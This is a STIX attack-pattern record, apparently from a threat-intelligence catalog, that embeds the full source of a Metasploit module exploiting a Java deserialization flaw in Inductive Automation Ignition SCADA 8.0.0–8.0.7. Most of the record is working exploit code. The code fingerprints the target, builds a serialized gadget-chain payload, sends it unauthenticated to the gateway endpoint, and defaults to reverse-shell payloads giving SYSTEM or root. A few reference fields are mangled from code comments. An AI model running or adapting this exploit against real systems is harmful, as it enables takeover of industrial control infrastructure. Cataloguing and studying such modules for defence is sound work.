{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a9e509cb-77a6-4461-9862-d13ae255b7bb",
    "created": "2024-08-14T17:05:19.219555Z",
    "modified": "2024-08-14T17:05:19.219559Z",
    "name": "Inductive Automation Ignition Remote Code Execution",
    "description": " This module exploits a Java deserialization vulnerability in the Inductive Automation Ignition SCADA product versions 8.0.0 to (and including) 8.0.7. This exploit was tested on versions 8.0.0 and 8.0.7 on both Linux and Windows. The default configuration is exploitable by an unauthenticated attacker, which can achieve remote code execution as SYSTEM on a Windows installation and root on Linux. The vulnerability was discovered and exploited at Pwn2Own Miami 2020 by the Flashback team (Pedro Ribeiro + Radek Domanski).  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/scada/inductive_ignition_rce.rb",
            "external_id": "inductive_ignition_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/rce_me_v2/rce_me_v2.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Miami2020/rce_me_v2.md"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10644"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-12004"
        },
        {
            "source_name": "#tryagain",
            "external_id": "versions<8useadifferentURL"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::JavaDeserialization\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Inductive Automation Ignition Remote Code Execution',\n        'Description' => %q{\n          This module exploits a Java deserialization vulnerability in the Inductive Automation Ignition SCADA product,\n          versions 8.0.0 to (and including) 8.0.7.\n          This exploit was tested on versions 8.0.0 and 8.0.7 on both Linux and Windows.\n          The default configuration is exploitable by an unauthenticated attacker, which can achieve\n          remote code execution as SYSTEM on a Windows installation and root on Linux.\n          The vulnerability was discovered and exploited at Pwn2Own Miami 2020 by the Flashback team (Pedro Ribeiro +\n          Radek Domanski).\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>',                    # Vulnerability discovery and Metasploit module\n          'Radek Domanski <radek.domanski[at]gmail.com> @RabbitPro' # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'URL', 'https://www.zerodayinitiative.com/blog/2020/6/10/a-trio-of-bugs-used-to-exploit-inductive-automation-at-pwn2own-miami'],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Miami_2020/rce_me_v2/rce_me_v2.md'],\n          [ 'URL', 'https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Miami2020/rce_me_v2.md'],\n          [ 'CVE', '2020-10644'],\n          [ 'CVE', '2020-12004'],\n          [ 'ZDI', '20-685'],\n          [ 'ZDI', '20-686'],\n        ],\n        'Privileged' => true,\n        'Platform' => %w[unix win],\n        'DefaultOptions' => {\n          'WfsDelay' => 15\n        },\n        'Targets' => [\n          [ 'Automatic', {} ],\n          [\n            'Windows',\n            {\n              'Platform' => 'win',\n              'DefaultOptions' =>\n              { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }\n            },\n          ],\n          [\n            'Linux',\n            {\n              'Platform' => 'unix',\n              'Arch' => [ARCH_CMD],\n              'DefaultOptions' =>\n              { 'PAYLOAD' => 'cmd/unix/reverse_python' }\n            },\n          ]\n        ],\n        'DisclosureDate' => '2020-06-11',\n        'DefaultTarget' => 0\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(8088)\n      ]\n    )\n  end\n\n  def version_get\n    res = send_request_cgi({\n      'uri' => '/system/gwinfo',\n      'method' => 'GET'\n    })\n\n    if res && res.code == 302\n      # try again, versions < 8 use a different URL\n      res = send_request_cgi({\n        'uri' => '/main/system/gwinfo',\n        'method' => 'GET'\n      })\n    end\n\n    if res && res.code == 200\n      # Regexp to get the version of the server\n      version = res.body.match(/;Version=([0-9.]{3,});/)\n      if version\n        return version[1]\n      end\n    end\n    return ''\n  end\n\n  def os_get\n    res = send_request_cgi({\n      'uri' => '/system/gwinfo',\n      'method' => 'GET'\n    })\n    if res && res.code == 200\n      # Regexp to get the OS\n      os = res.body.match(/OS=([a-zA-Z0-9\\s]+);/)\n      return os[1]\n    end\n  end\n\n  def create_java_str(payload)\n    (\n      \"\\xac\\xed\" +                  # STREAM_MAGIC\n      \"\\x00\\x05\" +                  # STREAM_VERSION\n      \"\\x74\" +                      # String object\n      [payload.length].pack('n') +  # length\n      payload\n    ).force_encoding('ascii')       # is this needed in msf?\n  end\n\n  def check\n    version = Rex::Version.new(version_get)\n    if version.segments.length < 3\n      fail_with(Failure::Unknown, 'Failed to obtain target version')\n    end\n    print_status(\"#{peer} - Detected version #{version}\")\n    if version >= Rex::Version.new('8.0.0') && version <= Rex::Version.new('8.0.7')\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def pick_target\n    os = os_get\n    if os.include?('Windows')\n      return targets[1]\n    elsif os.include?('Linux')\n      return targets[2]\n    else\n      fail_with(Failure::NoTarget, \"#{peer} - Unable to select a target, we must bail out.\")\n    end\n  end\n\n  def exploit\n    # Check if automatic target selection is set\n    if target.name == 'Automatic'\n      my_target = pick_target\n    else\n      my_target = target\n    end\n    print_status(\"#{peer} - Attacking #{my_target.name} target\")\n\n    # <version> is a CRC32 calculated by the server that we didn't want to reverse\n    # However in com.inductiveautomation.ignition.gateway.servlets.Gateway.doPost()\n    # (line 383 of gateway-8.0.7.jar)\n    # ... it will helpfully ignore the version if set to 0\n    data =\n      '<?xml version=\"1.0\" encoding=\"UTF-8\"?><requestwrapper><version>0</version><scope>2</scope><message><messagetype>199</messagetype><messagebody>'\\\n      '<arg name=\"funcId\"><![CDATA[ProjectDownload]]></arg><arg name=\"subFunction\"><![CDATA[getDiff]]></arg><arg name=\"arg\" index=\"0\">'\\\n      '<![CDATA['\n\n    version = Rex::Version.new(version_get)\n\n    if version\n      print_status(\"#{peer} - Detected version #{version}\")\n    else\n      print_error(\"#{peer} - Target has an unknown version, this might not work...\")\n    end\n\n    # Version 8.0.0 doesn't work with CommonsBeanutils1, but CommonsCollections6 works!\n    #\n    # An alternative to this would be GET /system/launchmf/D which will helpfully return\n    # a list of all the jars in the system, letting us pick the right gadget chain.\n    # However only 8.0.0 differs, so let's just have a special case for that.\n    if version == Rex::Version.new('8.0.0')\n      lib = 'CommonsCollections6'\n    else\n      lib = 'CommonsBeanutils1'\n    end\n\n    java_payload = generate_java_deserialization_for_payload(lib, payload)\n    java_payload = Rex::Text.encode_base64(java_payload)\n    java_payload = create_java_str(java_payload)\n    java_payload = Rex::Text.encode_base64(java_payload)\n    data += java_payload\n\n    data += ']]></arg></messagebody></message><locale><l>en</l><c>GB</c><v></v></locale></requestwrapper>'\n\n    print_status(\"#{peer} - Sending payload...\")\n\n    res = send_request_cgi({\n      'uri' => '/system/gateway',\n      'method' => 'POST',\n      'data' => data\n    })\n\n    if res&.body&.include?('Unable to load project diff.')\n      print_good(\"#{peer} - Success, shell incoming!\")\n    else\n      print_error(\"#{peer} - Something is not right, try again?\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-06-11",
    "x_mitre_platforms": [
        "unix'"
    ]
}